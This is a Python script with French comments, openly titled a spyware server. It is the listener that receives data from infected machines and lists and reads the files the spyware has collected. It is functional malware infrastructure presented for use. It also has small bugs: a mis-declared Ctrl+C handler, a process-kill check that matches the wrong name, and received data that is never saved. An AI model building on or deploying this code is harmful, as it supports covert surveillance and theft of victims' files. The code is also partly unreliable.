import argparse
import os
import socket
import signal
import sys
import psutil  #sudo apt install python3-psutil

class Server:
    """
    Classe qui gère le serveur du spyware.
    """
    def __init__(self, port):
        """
        Initialise les attributs port et server_socket.

        Retourne :
            Aucune valeur de retour.
        """
        self.port = port
        self.server_socket = None

    def start_listening(self):
        """
        Se mets en écoute sur le port TCP. 

        Retourne :
            Aucune valeur de retour.
        """
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.bind(("0.0.0.0", self.port))
            self.server_socket.listen(1)

            print(f"Server is listening on port {self.port}")

            signal.signal(signal.SIGINT, self.signal_handler)

            client_socket, client_address = self.server_socket.accept()
            print(f"Accepted connection from {client_address}")

            data = client_socket.recv(1024)
            print(f"Received data: {data.decode('utf-8')}")

            client_socket.close()
            self.server_socket.close()
        except Exception as e:
            print(f"Error while listening: {e}")

    def signal_handler(self):
        """
        Stop l'écoute avec ctrl+C.

        Retourne :
            Aucune valeur de retour.
        """
        print("\nCtrl+C received. Closing the server.")
        if self.server_socket:
            self.server_socket.close()
        sys.exit(0)

    def list_files(self):
        """
        Liste les fichiers envoyé par le Spyware. Ils sont enregistrés dans le fichier "Fichier".

        Retourne : 
            Aucune valeur de retour.
        """
        try:
            files = os.listdir("Fichier")
            if not files:
                print("No files available.")
            else:
                print("List of files:")
                for file_name in files:
                    print(file_name)
        except Exception as e:
            print(f"Error while listing files: {e}")

    def read_file(self, file_name):
        """
        Lire le fichier précisée.

        Retourne:
            Aucune valeur de retour.
        """
        try:
            with open(os.path.join("Fichier", file_name), 'r') as file:
                content = file.read()
                print(f"Content of {file_name}:")
                print(content)
        except Exception as e:
            print(f"Error while reading the file {file_name}: {e}")

def kill_all_servers():
    """
    Stop le programme s'il est lancé.

    Retourne:
        Aucune valeur de retour.
    """
    try:
        for process in psutil.process_iter(['pid', 'name']):
            if 'server.py' in process.info['name']:
                print(f"Terminating server with PID: {process.info['pid']}")
                psutil.Process(process.info['pid']).terminate()
    except Exception as e:
        print(f"Error while killing servers: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Spyware Server")

    parser.add_argument("-s", "--show", action="store_true", help="Affiche la liste des fichiers")
    parser.add_argument("-r", "--read", metavar="FILE", help="Lire le contenu du fichier spécifié")
    parser.add_argument("-l", "--listen", type=int, metavar="PORT", help="Se met en écoute sur le port TCP spécifié")
    parser.add_argument("-k", "--kill", action="store_true", help="Arrête toutes les instances de serveurs")
    args = parser.parse_args()

    if args.kill:
        kill_all_servers()
    else:
        server = Server(args.listen) if args.listen else Server(0)

        if args.listen:
            server.start_listening()
        elif args.show:
            server.list_files()
        elif args.read:
            server.read_file(args.read)
        else:
            print("Veuillez entrer une option (-h, --help)")
